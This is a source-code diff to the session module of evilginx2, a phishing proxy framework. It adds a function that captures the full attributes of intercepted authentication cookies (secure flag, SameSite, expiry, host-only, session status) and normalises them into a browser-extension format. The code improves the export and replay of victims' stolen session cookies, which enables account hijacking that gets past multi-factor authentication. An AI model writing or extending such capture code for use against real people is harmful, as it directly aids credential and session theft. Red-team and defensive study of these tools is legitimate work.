@@ -1,6 +1,7 @@
 package core
 
 import (
+	"strings"
 	"time"
 
 	"github.com/kgretzky/evilginx2/database"
@@ -71,23 +72,65 @@ func (s *Session) SetCustom(name string, value string) {
 }
 
 func (s *Session) AddCookieAuthToken(domain string, key string, value string, path string, http_only bool, expires time.Time) {
+	// Call the enhanced version with default values for backward compatibility
+	s.AddCookieAuthTokenFull(domain, key, value, path, http_only, false, "", expires, false)
+}
+
+// AddCookieAuthTokenFull captures all cookie attributes for proper export
+func (s *Session) AddCookieAuthTokenFull(domain string, key string, value string, path string, httpOnly bool, secure bool, sameSite string, expires time.Time, hostOnly bool) {
 	if _, ok := s.CookieTokens[domain]; !ok {
 		s.CookieTokens[domain] = make(map[string]*database.CookieToken)
 	}
 
-	if tk, ok := s.CookieTokens[domain][key]; ok {
-		tk.Name = key
-		tk.Value = value
-		tk.Path = path
-		tk.HttpOnly = http_only
-	} else {
-		s.CookieTokens[domain][key] = &database.CookieToken{
-			Name:     key,
-			Value:    value,
-			HttpOnly: http_only,
-		}
+	// Determine if this is a session cookie (no expiration)
+	isSession := expires.IsZero() || expires.Unix() <= 0
+
+	// Calculate expiration timestamp
+	var expirationDate int64 = 0
+	if !isSession {
+		expirationDate = expires.Unix()
 	}
 
+	// Normalize sameSite value to match browser extension format
+	normalizedSameSite := sameSite
+	switch strings.ToLower(sameSite) {
+	case "none":
+		normalizedSameSite = "no_restriction"
+	case "lax":
+		normalizedSameSite = "lax"
+	case "strict":
+		normalizedSameSite = "strict"
+	case "":
+		normalizedSameSite = "unspecified"
+	}
+
+	if tk, ok := s.CookieTokens[domain][key]; ok {
+		// Update existing cookie
+		tk.Name = key
+		tk.Value = value
+		tk.Domain = domain
+		tk.Path = path
+		tk.HttpOnly = httpOnly
+		tk.Secure = secure
+		tk.SameSite = normalizedSameSite
+		tk.ExpirationDate = expirationDate
+		tk.HostOnly = hostOnly
+		tk.Session = isSession
+	} else {
+		// Create new cookie
+		s.CookieTokens[domain][key] = &database.CookieToken{
+			Name:           key,
+			Value:          value,
+			Domain:         domain,
+			Path:           path,
+			HttpOnly:       httpOnly,
+			Secure:         secure,
+			SameSite:       normalizedSameSite,
+			ExpirationDate: expirationDate,
+			HostOnly:       hostOnly,
+			Session:        isSession,
+		}
+	}
 }
 
 func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAuthToken) bool {
